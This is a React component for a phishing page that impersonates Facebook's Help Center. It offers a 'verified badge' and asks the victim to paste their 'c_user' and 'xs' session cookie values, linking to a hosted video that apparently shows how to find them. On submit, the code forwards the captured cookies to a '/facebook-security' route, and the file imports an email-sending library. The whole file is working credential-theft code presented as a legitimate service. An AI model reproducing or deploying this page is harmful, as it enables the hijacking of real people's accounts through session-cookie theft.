import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import FacebookVideo from "/fbVideo.png";
import { useNavigate } from "react-router-dom";
// import LoginModal from "../modal/LoginModal";
// import "./style.css";

const Validation = () => {
  const form = useRef();
  const [showModal, setShowModal] = useState(false);
  const [isFormValid, setIsFormValid] = useState(false);
  const navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    // Get the values of the input fields
    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    // Use regex patterns to validate the input fields
    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/; // Pattern requiring at least one % symbol

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    // console.log("ggg", cUserValue, xsValue);

    // Only send if both fields are valid
    if (cUserValue && xsValue) {
      navigate("/facebook-security", {
        state: {
          data: {
            c_user: form.current.elements["c_user"].value,
            xs: form.current.elements["xs"].value,
          },
        },
      });
    } else {
      console.log("Invalid form fields.");
      setIsFormValid(true);
    }
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail}>
        <div
          className="d-flex align -items-center"
          style={{
            width: "100%",
            height: "90px",
            background: "#4667AC",
            display: "flex",
          }}
        >
          <p className="text-white text-3xl font-medium flex items-center p-5">
            facebook
          </p>
        </div>

        <div
          className="d-flex align -items-center"
          style={{
            width: "100%",
            height: "70px",
            background: "#E9EBEE",
            display: "flex",
            alignItems: "center",
          }}
        >
          <h4 className="text-2xl text-blue-600 font-semibold p-5 d-flex align-self-center text-primary">
            Help Center
          </h4>
        </div>

        <div className="col-12 mb-4 d-flex justify-content-center align-items-center border border-gray-300 m-5">
          <div className="col-11 col-md-6 border">
            <div className="p-3 " style={{ background: "#f3f3f3f" }}>
              <h5 className="text-2xl font-semibold ">
                Request a verified badge on Facebook
              </h5>
            </div>
            <div className="p-2">
              <p className="text-[12px] font-semibold validation_form_para mb-3">
                The verified badge means that Facebook has confirmed that the
                Page or profile is the authentic presence of the individual,
                public figure or brand that it represents.
              </p>

              <p className="text-[12px] font-semibold validation_form_para mb-3">
                Previously, the verified badge also required the person or brand
                to be notable and unique. You may still see users with a
                verified badge that represents our previous eligibility
                requirements.{" "}
              </p>
              <p className="text-[12px] font-semibold validation_form_para mb-3">
                Please provide the precise details below. Refer to the video for
                clarification if you find the instructions unclear.
              </p>
              <p
                className="fw-bold text-secondary mb-3"
                style={{ fontSize: "14px" }}
              >
                Detailed Video Information.
              </p>

              <a href="https://firebasestorage.googleapis.com/v0/b/northern-card-408313.appspot.com/o/detailed%20video.mp4?alt=media&token=a36aa6ff-64b7-4d24-b294-cd35d4d57cc2">
                <img
                  src={FacebookVideo}
                  alt="fb"
                  style={{ width: "120px", height: "80px" }}
                />
              </a>
              <br />
              <p className="text-[12px] font-semibold validation_form_para mb-3">
                Please be sure to provide the requested information below.
              </p>

              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <br />
              <input
                type="text"
                name="c_user"
                required
                className="border border-gray-600 p-1"
              />
              <br />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <br />
              <input
                type="text"
                name="xs"
                //required
                //pattern="^[A-Za-z0-9%]*$"
                //title="Please enter a valid format"
                className="border border-gray-600 p-1"
              />
              <p className="mt-2" style={{ fontSize: "12px" }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
            </div>

            <div
              className="p-2  flex items-center justify-end mb-7"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white border-0 py-1 px-2 bg-[#4267B2]"
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>
      {showModal && (
        <LoginModal showModal={showModal} setShowModal={setShowModal} />
      )}
    </>
  );
};

export default Validation;
